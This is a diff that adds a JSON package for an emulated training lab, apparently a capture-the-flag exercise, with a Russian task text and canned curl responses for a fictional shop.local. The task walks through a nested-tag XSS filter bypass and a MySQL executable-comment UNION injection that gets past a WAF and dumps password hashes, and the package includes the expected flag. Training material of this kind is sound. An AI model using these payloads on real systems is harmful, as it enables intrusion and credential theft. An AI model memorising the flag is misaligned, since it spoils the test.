@@ -1,0 +1,47 @@
+{
+  "id": "web-logic-bypass-chains",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{w4f_p4rs3r_d1s4gr33m3nt_un10n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: обход фильтра WAF и цепочка\n\n`shop.local` фильтрует ввод и ставит WAF перед API. Обойди и то, и другое.\n\n1. Фильтр вырезает теги по шаблону. Вложи тег в тег:\n   curl -s 'https://shop.local/search?q=<scr<script>ipt>alert(1)</script>'\n2. WAF блокирует грубый SQLi (403):\n   curl -s -o /dev/null -w '%{http_code}\\n' 'https://shop.local/api/user?id=1%20UNION%20SELECT%20pass%20FROM%20users'\n3. Обойди WAF расхождением парсеров — «исполняемый комментарий» MySQL:\n   curl -s 'https://shop.local/api/user?id=1/*!50000UNION*/SELECT%20pass%20FROM%20users'\n4. В выводе — флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/search и /api/user)",
+      "cases": [
+        {
+          "match": "50000UNION",
+          "example": "-s 'https://shop.local/api/user?id=1/*!50000UNION*/SELECT%20pass%20FROM%20users'",
+          "output": "{\"id\":1,\"name\":\"admin\",\"pass\":\"$2y$10$h4ck3d...\",\"dump\":[\"admin:$2y$10$h4ck3d\",\"bob:$2y$10$x\"],\"flag\":\"nto{w4f_p4rs3r_d1s4gr33m3nt_un10n}\"}\n"
+        },
+        {
+          "match": "UNION",
+          "example": "-s -o /dev/null -w '%{http_code}' 'https://shop.local/api/user?id=1%20UNION%20SELECT%20pass%20FROM%20users'",
+          "output": "403\n"
+        },
+        {
+          "match": "scr<script>",
+          "example": "-s 'https://shop.local/search?q=<scr<script>ipt>alert(1)</script>'",
+          "output": "<div class=\"results\">1 result for: <script>alert(1)</script></div>\n"
+        },
+        {
+          "match": "search",
+          "example": "-s 'https://shop.local/search?q=<script>alert(1)</script>'",
+          "output": "<div class=\"results\">0 results for: alert(1)</div>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /search и /api/user на shop.local.\n"
+    }
+  }
+}
